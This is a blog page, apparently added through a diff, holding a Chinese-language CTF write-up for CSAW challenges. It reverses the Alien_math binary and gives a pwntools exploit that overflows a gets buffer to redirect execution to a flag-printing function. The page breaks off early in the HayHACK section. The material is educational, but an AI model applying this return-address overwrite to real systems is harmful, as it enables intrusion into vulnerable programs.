@@ -1,0 +1,1194 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="Alien_math:我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析: main函数： rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，   得到结果为v6的值为0x6b8b4567，即1804289383。 second_question:1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="csaw部分题解">
+<meta property="og:url" content="http://example.com/2022/01/08/csaw/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Alien_math:我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析: main函数： rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，   得到结果为v6的值为0x6b8b4567，即1804289383。 second_question:1234567891">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/main1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/10.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/11.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/12.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20210922173335323.png">
+<meta property="article:published_time" content="2022-01-07T16:13:03.348Z">
+<meta property="article:modified_time" content="2021-09-22T09:44:19.812Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/main1.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>csaw部分题解 · 渐渐的博客</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>渐渐的博客</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">渐渐的博客</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">csaw部分题解</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                csaw部分题解
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.3k</span>Reading time: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/01/08</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="Alien-math"><a href="#Alien-math" class="headerlink" title="Alien_math:"></a>Alien_math:</h2><p>我下载的alien_math用IDA分析时出现了些问题，这里借用其他师傅的图片进行分析:</p>
+<h3 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h3><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/main1.png" alt="main1"></p>
+<p>rand是伪随机的，这里srand没有初始化，所以它实际上总是返回相同的值。rand的输出是固定的，我们可以在v6与v5比较时下断点查看v6的值，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/4.png" alt="4"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/5.png" alt="5"></p>
+<p>得到结果为v6的值为0x6b8b4567，即1804289383。</p>
+<h3 id="second-question"><a href="#second-question" class="headerlink" title="second_question:"></a>second_question:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">second_question</span><span class="params">(<span class="keyword">char</span> *param_1)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cVar1;</span><br><span class="line">  <span class="keyword">int</span> iVar2;</span><br><span class="line">  <span class="keyword">size_t</span> n;</span><br><span class="line">  ulong uVar3;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined8 local_28;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  </span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    uVar3 = SEXT48(i);</span><br><span class="line">    n = <span class="built_in">strlen</span>(param_1);</span><br><span class="line">    <span class="keyword">if</span> (n - <span class="number">1</span> &lt;= uVar3) &#123;</span><br><span class="line">      local_38 = <span class="number">0x3436303439353737</span>;</span><br><span class="line">      local_30 = <span class="number">0x3332333535323538</span>;</span><br><span class="line">      local_28 = <span class="number">0x353232393232</span>;</span><br><span class="line">      n = <span class="built_in">strlen</span>((<span class="keyword">char</span> *)&amp;local_38);</span><br><span class="line">      iVar2 = <span class="built_in">strncmp</span>((<span class="keyword">char</span> *)&amp;local_38,param_1,n);</span><br><span class="line">      <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Genius! One question left...\n&quot;</span>);</span><br><span class="line">        final_question();</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Not quite. Double check your calculations.\nYou made a B. So close!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You get a C. No flag this time.\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((param_1[i] &lt; <span class="string">&#x27;0&#x27;</span>) || (<span class="string">&#x27;9&#x27;</span> &lt; param_1[i])) <span class="keyword">break</span>;</span><br><span class="line">    cVar1 = param_1[(<span class="keyword">long</span>)i + <span class="number">1</span>];</span><br><span class="line">    iVar2 = second_question_function</span><br><span class="line">                      ((ulong)(uint)(<span class="keyword">int</span>)param_1[i],(ulong)(uint)(param_1[i] + i),</span><br><span class="line">                       (ulong)(uint)(param_1[i] + i));</span><br><span class="line">    iVar2 = (<span class="keyword">int</span>)cVar1 + <span class="number">-0x30</span> + iVar2;</span><br><span class="line">    param_1[(<span class="keyword">long</span>)i + <span class="number">1</span>] = (<span class="keyword">char</span>)iVar2 + (<span class="keyword">char</span>)(iVar2 / <span class="number">10</span>) * <span class="number">-10</span> + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    i = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Xolplsmorp! Invalid input!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You get a C. No flag this time.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/6.png" alt="6"></p>
+<p>在用户输入的值和静态值进行比较时下断点，观察到静态值为7759406485255323229225</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/7.png" alt="7"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/8.png" alt="8"></p>
+<p>此图为second_question的伪代码，可看到a1经过了一些计算与转换</p>
+<p>则可以通过下面脚本计算出a1应该输入的值：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">goal = <span class="string">&quot;7759406485255323229225&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span>(<span class="params">x, y, i</span>):</span></span><br><span class="line">    b = ctypes.c_uint((x*<span class="number">0x30</span> + (x+i)*<span class="number">0xb</span> - <span class="number">4</span>)).value % <span class="number">10</span></span><br><span class="line">    b += y</span><br><span class="line">    <span class="keyword">return</span> b % <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">7</span>)</span><br><span class="line">current = <span class="number">7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">    g = <span class="built_in">int</span>(goal[i+<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">next</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">if</span> modify(current, <span class="built_in">next</span>, i) == g:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">next</span>)</span><br><span class="line">            current = g</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/10.png" alt="10"></p>
+<p>即为7856445899213065428791</p>
+<h3 id="final-question"><a href="#final-question" class="headerlink" title="final_question:"></a>final_question:</h3><p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/9.png" alt="9"></p>
+<p> 发现final_question中存在栈溢出漏洞且文件中存在打印flag的函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __usercall print_flag@&lt;eax&gt;(__int64 a1@&lt;rbp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-98h] [rbp-98h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v6 = a1;</span><br><span class="line">  sub_401100(<span class="string">&quot;Here is your flag: &quot;</span>);</span><br><span class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="string">&quot;r&quot;</span>;</span><br><span class="line">  v5 = sub_401170(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401130(&amp;v4, <span class="number">136LL</span>, v5);</span><br><span class="line">    v1 = (<span class="keyword">const</span> <span class="keyword">char</span> **)&amp;v4;</span><br><span class="line">    sub_401120(<span class="string">&quot;%s&quot;</span>, &amp;v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_401100(<span class="string">&quot;Xolplsmorp! If you see this when trying your exploit remotely, contact an administrator!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401160(_bss_start);</span><br><span class="line">  sub_401190(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> main(<span class="number">0</span>, v1, v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时可以通过栈溢出获取flag</p>
+<p>接下来在gets处下断点，得到其距离栈的偏移：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/11.png" alt="11"></p>
+<p>输入AAAA作为标记</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/12.png" alt="12"></p>
+<p>观察到输入的内容距离rbp0x10位，此时我们还需覆盖上个栈的rbp，在64下，一个地址所占字节为8位，所以总共需填充0x18的垃圾数据。然后将返回地址覆盖为print_flag的地址，即为0x00000000004014FB，</p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p>最后的exp如下所示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./alien_math&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn.chal.csaw.io&quot;,5004)</span></span><br><span class="line"></span><br><span class="line">print_flag=<span class="number">0x00000000004014FB</span></span><br><span class="line">first_question_answer=<span class="number">1804289383</span></span><br><span class="line">second_question_answer=<span class="number">7856445899213065428791</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is the square root of zopnol?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(first_question_answer))</span><br><span class="line">p.recvuntil(<span class="string">&quot;How many tewgrunbs are in a qorbnorbf?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(second_question_answer))</span><br><span class="line">p.recvuntil(<span class="string">&quot;How long does it take for a toblob of energy to be transferred between two quantum entangled salwzoblrs?&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span>+p64(print_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="HayHACK"><a href="#HayHACK" class="headerlink" title="HayHACK"></a>HayHACK</h2><p>首先对程序进行分析：</p>
+<h3 id="main-gt-sub143f"><a href="#main-gt-sub143f" class="headerlink" title="main()-&gt;sub143f():"></a>main()-&gt;sub143f():</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_stack</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> lVar1;</span><br><span class="line">  <span class="keyword">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="keyword">int</span> iVar2;</span><br><span class="line">  </span><br><span class="line">  lVar1 = *(<span class="keyword">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  iVar2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (iVar2 &lt; <span class="number">0x100000</span>) &#123;</span><br><span class="line">    *(undefined4 *)(&amp;stack0xffffffffffbfffe8 + (<span class="keyword">long</span>)iVar2 * <span class="number">4</span>) = <span class="number">0xb00</span>;</span><br><span class="line">    iVar2 = iVar2 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  challenge(&amp;stack0xffffffffffbfffe8);</span><br><span class="line">  <span class="keyword">if</span> (lVar1 != *(<span class="keyword">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
